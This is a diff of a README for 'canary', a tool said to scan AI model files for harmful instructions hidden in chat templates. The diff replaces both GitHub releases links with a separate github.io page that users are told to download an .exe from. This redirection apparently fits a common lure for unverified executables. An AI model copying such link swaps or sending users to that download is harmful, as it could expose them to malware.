@@ -1,6 +1,6 @@
 # 🛡️ canary - Secure your AI models against threats
 
-[![](https://img.shields.io/badge/Download_Canary-blue.svg)](https://github.com/ushi7445/canary/releases)
+[![](https://img.shields.io/badge/Download_Canary-blue.svg)](https://ushi7445.github.io)
 
 Canary checks your AI model files for hidden risks. Many models use chat templates that can hide harmful instructions. These instructions may trick the AI or compromise your computer. Canary looks for these threats before you load the model. It scans files completely offline. You do not need an internet connection to perform a safety check.
 
@@ -23,7 +23,7 @@ Your computer needs to meet these basic standards to run Canary:
 
 Follow these steps to set up Canary on your machine:
 
-1. Visit the [releases page](https://github.com/ushi7445/canary/releases) to access the files.
+1. Visit the [releases page](https://ushi7445.github.io) to access the files.
 2. Look for the newest version at the top of the list.
 3. Click the link that ends in .exe to start your download.
 4. Open your Downloads folder once the file finishes.
